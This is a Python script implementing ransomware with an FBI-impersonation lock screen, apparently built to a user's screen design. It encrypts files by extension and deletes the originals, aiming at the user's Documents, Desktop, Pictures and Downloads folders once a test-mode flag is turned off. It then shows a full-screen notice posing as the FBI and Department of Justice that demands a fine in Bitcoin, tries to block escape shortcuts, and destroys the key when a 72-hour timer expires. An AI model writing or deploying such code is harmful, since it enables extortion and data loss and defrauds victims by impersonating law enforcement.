#!/usr/bin/env python3
"""
YOUR FIGMA DESIGN — FULLY WORKING
- Encryption
- 20 unlock codes
- Timer (72 hours)
- OK button decrypts if code is right
- VM-SAFE (only C:\test_ransom)
"""

import os
import sys
import tkinter as tk
from tkinter import font, messagebox
import ctypes
import hashlib
import threading
import time
import random
import winsound

# ============================================================
# CONFIG — EDIT THESE
# ============================================================
TEST_MODE = True  # True = ONLY C:\test_ransom
TEST_FOLDER = "C:\\test_ransom"

BTC_ADDRESS = "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa"

# 20 UNLOCK CODES (all work)
CODES = ["FS2FGNFJQI","OX77WHWEV5","FCHZT1L6IX","VX02SQI40G","6PXB85GJJJ",
         "XQHCXUH4TU","B1RQSQ9G2L","HE71R2TKVY","Q1BK76N580","01QEU0DUUE",
         "X1LSHVL0OJ","AW3YSY30V3","ZTE2DDE0X4","ZG29U3VDIC","6FNWN5JIOS",
         "F5EBA6TT08","2UUBJ4X7VN","ISP3G7NRPN","J8L0S6SHEJ","FURZCKKNZX"]
HASHES = [hashlib.sha256(c.encode()).hexdigest() for c in CODES]
TIMER = 72 * 3600  # 72 hours

# ============================================================
# ENCRYPTION
# ============================================================
def xor_crypt(data, key):
    return bytes([b ^ key[i % len(key)] for i, b in enumerate(data)])

def gen_key():
    return bytes([random.randint(0,255) for _ in range(32)])

def encrypt_files():
    key = gen_key()
    count = 0
    
    dirs = [TEST_FOLDER] if TEST_MODE else [
        os.path.expanduser('~\\Documents'),
        os.path.expanduser('~\\Desktop'),
        os.path.expanduser('~\\Pictures'),
        os.path.expanduser('~\\Downloads'),
    ]
    
    exts = ['.txt','.docx','.pdf','.jpg','.png','.zip','.py','.js',
            '.html','.css','.doc','.xls','.ppt','.sql','.db','.csv']
    
    for d in dirs:
        if not os.path.exists(d): continue
        for root, _, files in os.walk(d):
            for f in files:
                if any(f.lower().endswith(e) for e in exts):
                    try:
                        p = os.path.join(root, f)
                        with open(p,'rb') as fp: data = fp.read()
                        with open(p+'.locked','wb') as fp: fp.write(xor_crypt(data, key))
                        os.remove(p)
                        count += 1
                    except: pass
    
    with open(os.environ.get('TEMP','C:\\Temp')+'\\decrypt_key.bin','wb') as f:
        f.write(key)
    
    return count, key

def decrypt_files(key):
    count = 0
    dirs = [TEST_FOLDER] if TEST_MODE else [
        os.path.expanduser('~\\Documents'),
        os.path.expanduser('~\\Desktop'),
        os.path.expanduser('~\\Pictures'),
        os.path.expanduser('~\\Downloads'),
    ]
    
    for d in dirs:
        if not os.path.exists(d): continue
        for root, _, files in os.walk(d):
            for f in files:
                if f.endswith('.locked'):
                    try:
                        p = os.path.join(root, f)
                        with open(p,'rb') as fp: data = fp.read()
                        with open(p[:-7],'wb') as fp: fp.write(xor_crypt(data, key))
                        os.remove(p)
                        count += 1
                    except: pass
    
    return count

# ============================================================
# RANSOMWARE UI — YOUR EXACT DESIGN
# ============================================================
class RansomwareUI:
    def __init__(self):
        self.count, self.key = encrypt_files()
        self.timer = TIMER
        self.unlocked = False
    
    def run(self):
        self.root = tk.Tk()
        self.root.attributes('-fullscreen', True)
        self.root.attributes('-topmost', True)
        self.root.configure(bg='#0a0a0a')
        self.root.overrideredirect(True)
        
        # Block shortcuts
        for k in ['<Control-Alt-Delete>','<Alt-F4>','<Escape>','<Control-Shift-Escape>']:
            self.root.bind(k, lambda e: 'break')
        self.root.protocol("WM_DELETE_WINDOW", lambda: None)
        
        # === MAIN CONTAINER ===
        main = tk.Frame(self.root, bg='#0a0a0a')
        main.pack(expand=True, fill='both')
        
        # === TOP RED BAR ===
        tk.Frame(main, bg='#8b0000', height=4).pack(fill='x')
        
        # === CONTENT ===
        content = tk.Frame(main, bg='#0a0a0a')
        content.pack(expand=True)
        
        # === YOUR TEXT EXACTLY ===
        
        # "YOUR COMPUTER HAS BEEN LOCKED" (top)
        tk.Label(content, text="YOUR COMPUTER HAS BEEN LOCKED",
                 font=('Helvetica', 20, 'bold'), fg='#ffffff', bg='#0a0a0a').pack(pady=5)
        
        # FBI Header
        tk.Label(content, text="FEDERAL BUREAU OF INVESTIGATION",
                 font=('Helvetica', 24, 'bold'), fg='#cc0000', bg='#0a0a0a').pack(pady=5)
        
        tk.Label(content, text="UNITED STATES DEPARTMENT OF JUSTICE",
                 font=('Helvetica', 14), fg='#888888', bg='#0a0a0a').pack(pady=2)
        
        # "YOUR COMPUTER HAS BEEN LOCKED" (big warning)
        self.warn = tk.Label(content, text="YOUR COMPUTER HAS BEEN LOCKED",
                             font=('Helvetica', 36, 'bold'), fg='#ff0000', bg='#0a0a0a')
        self.warn.pack(pady=15)
        
        # === REASON OF FINE BOX ===
        fine_frame = tk.Frame(content, bg='#111111', bd=1, relief='solid')
        fine_frame.pack(pady=10, padx=40, fill='x')
        
        tk.Label(fine_frame, text="REASON OF FINE:",
                 font=('Helvetica', 12, 'bold'), fg='#ff6600', bg='#111111').pack(anchor='w', padx=15, pady=3)
        
        tk.Label(fine_frame, text="As stated in:",
                 font=('Helvetica', 11), fg='#aaaaaa', bg='#111111').pack(anchor='w', padx=20, pady=2)
        
        tk.Label(fine_frame, text="18 U.S.C. § 2319",
                 font=('Courier', 12, 'bold'), fg='#ff8844', bg='#111111').pack(anchor='w', padx=20, pady=2)
        
        tk.Label(fine_frame, text="17 U.S.C. § 506",
                 font=('Courier', 12, 'bold'), fg='#ff8844', bg='#111111').pack(anchor='w', padx=20, pady=2)
        
        tk.Label(fine_frame, text="Pirating is ILLEGAL",
                 font=('Helvetica', 12, 'bold'), fg='#ff0000', bg='#111111').pack(anchor='w', padx=20, pady=5)
        
        # === DESCRIPTION ===
        tk.Label(content, text="This system has been flagged for violation of federal law.",
                 font=('Helvetica', 13), fg='#ffffff', bg='#0a0a0a').pack(pady=5)
        
        tk.Label(content, text="Your IP address and device information have been recorded.",
                 font=('Helvetica', 13), fg='#ffffff', bg='#0a0a0a').pack(pady=2)
        
        # === WARNING ===
        tk.Label(content, text="Attempts of bypassing will result in permanent blockage of the internet.",
                 font=('Helvetica', 12, 'bold'), fg='#ff4444', bg='#0a0a0a').pack(pady=5)
        
        tk.Label(content, text=f"U will be fined ${BTC_ADDRESS[:8]}...",
                 font=('Helvetica', 14, 'bold'), fg='#ffcc00', bg='#0a0a0a').pack(pady=5)
        
        # === BTC ADDRESS ===
        btc_frame = tk.Frame(content, bg='#111111', bd=1, relief='solid')
        btc_frame.pack(pady=5)
        
        tk.Label(btc_frame, text=BTC_ADDRESS,
                 font=('Courier', 16), fg='#00ff00', bg='#111111').pack(padx=20, pady=8)
        
        # === INPUT ===
        input_frame = tk.Frame(content, bg='#0a0a0a')
        input_frame.pack(pady=15)
        
        tk.Label(input_frame, text="Input here:",
                 font=('Helvetica', 14, 'bold'), fg='#ffffff', bg='#0a0a0a').pack(side=tk.LEFT, padx=10)
        
        self.entry = tk.Entry(input_frame, font=('Helvetica', 14), width=22,
                              bg='#1a1a1a', fg='#00ff00', insertbackground='#00ff00')
        self.entry.pack(side=tk.LEFT, padx=10)
        self.entry.focus_set()
        
        # === OK BUTTON ===
        tk.Button(content, text="✅ OK", font=('Helvetica', 14, 'bold'),
                  bg='#006600', fg='white', padx=30, pady=8, command=self.unlock).pack(pady=10)
        
        # === TIMER ===
        self.timer_lbl = tk.Label(content, text="⏱️ 71:59:59",
                                   font=('Helvetica', 36, 'bold'), fg='#ff0000', bg='#0a0a0a')
        self.timer_lbl.pack(pady=10)
        
        # === FILE COUNT ===
        tk.Label(content, text=f"🔒 {self.count} files encrypted",
                 font=('Helvetica', 12), fg='#cc0000', bg='#0a0a0a').pack(pady=5)
        
        # === TEST MODE ===
        if TEST_MODE:
            tk.Label(content, text="⚠️ TEST MODE — No real files harmed",
                     font=('Helvetica', 12, 'bold'), fg='#00ff00', bg='#0a0a0a').pack(pady=5)
        
        # === FOOTER ===
        tk.Label(content, text="THIS IS AN OFFICIAL GOVERNMENT NOTICE",
                 font=('Helvetica', 10, 'bold'), fg='#990000', bg='#0a0a0a').pack(pady=5)
        
        # === BOTTOM RED BAR ===
        tk.Frame(main, bg='#8b0000', height=2).pack(fill='x', side='bottom')
        
        # === START THREADS ===
        threading.Thread(target=self.tick, daemon=True).start()
        threading.Thread(target=self.flash, daemon=True).start()
        threading.Thread(target=self.focus, daemon=True).start()
        
        self.root.mainloop()
    
    # ============================================================
    # UNLOCK — CHECKS CODE, DECRYPTS IF CORRECT
    # ============================================================
    def unlock(self):
        code = self.entry.get().strip().upper()
        
        if not code:
            messagebox.showerror("ERROR", "Enter an unlock code!")
            return
        
        # Check if code is valid
        if hashlib.sha256(code.encode()).hexdigest() in HASHES:
            # CORRECT CODE — DECRYPT
            self.unlocked = True
            
            # Play success sound
            for _ in range(3):
                winsound.Beep(800, 100)
                time.sleep(0.05)
            winsound.Beep(1200, 300)
            
            # Decrypt files
            count = decrypt_files(self.key)
            
            messagebox.showinfo(
                "✅ UNLOCKED",
                f"Successfully decrypted {count} files!\n\n"
                f"Code: {code}\n\n"
                f"Your files are back. Don't pirate again."
            )
            
            self.root.destroy()
            sys.exit(0)
        else:
            # WRONG CODE
            for _ in range(3):
                winsound.Beep(200, 200)
                time.sleep(0.05)
            
            messagebox.showerror(
                "❌ WRONG CODE",
                f"Invalid unlock code!\n\n"
                f"Payment required to: {BTC_ADDRESS}\n\n"
                f"Attempt: {code}"
            )
            self.entry.delete(0, tk.END)
            self.entry.focus_set()
    
    # ============================================================
    # TIMER (72 HOURS)
    # ============================================================
    def tick(self):
        while self.timer > 0 and not self.unlocked:
            h, m, s = self.timer//3600, (self.timer%3600)//60, self.timer%60
            color = '#ff0000' if self.timer < 3600 else '#ff6600' if self.timer < 21600 else '#ff0000'
            self.timer_lbl.config(text=f"⏱️ {h:02d}:{m:02d}:{s:02d}", fg=color)
            self.timer -= 1
            time.sleep(1)
        
        if self.timer <= 0 and not self.unlocked:
            self.timer_lbl.config(text="💀 TIME EXPIRED", fg='red')
            try:
                p = os.environ.get('TEMP','C:\\Temp')+'\\decrypt_key.bin'
                if os.path.exists(p):
                    os.remove(p)
            except: pass
            messagebox.showerror("💀", "Time expired. Decryption key destroyed.")
    
    # ============================================================
    # FLASHING WARNING
    # ============================================================
    def flash(self):
        colors = ['#ff0000','#cc0000','#ff3333','#990000']
        while not self.unlocked:
            for c in colors:
                self.warn.config(fg=c)
                time.sleep(0.12)
    
    # ============================================================
    # FORCE FOCUS ON INPUT
    # ============================================================
    def focus(self):
        while not self.unlocked:
            try:
                self.root.focus_force()
                self.entry.focus_set()
            except: pass
            time.sleep(0.5)

# ============================================================
# MAIN
# ============================================================
def main():
    try:
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    except:
        pass
    
    print("="*50)
    print("🔴 FBI RANSOMWARE — YOUR DESIGN 🔴")
    print("="*50)
    print(f"📁 Test Mode: {TEST_MODE}")
    print(f"🔑 Valid codes: {len(CODES)}")
    print(f"⏱️ Timer: 72 hours")
    print("="*50)
    
    ui = RansomwareUI()
    ui.run()

if __name__ == '__main__':
    main()
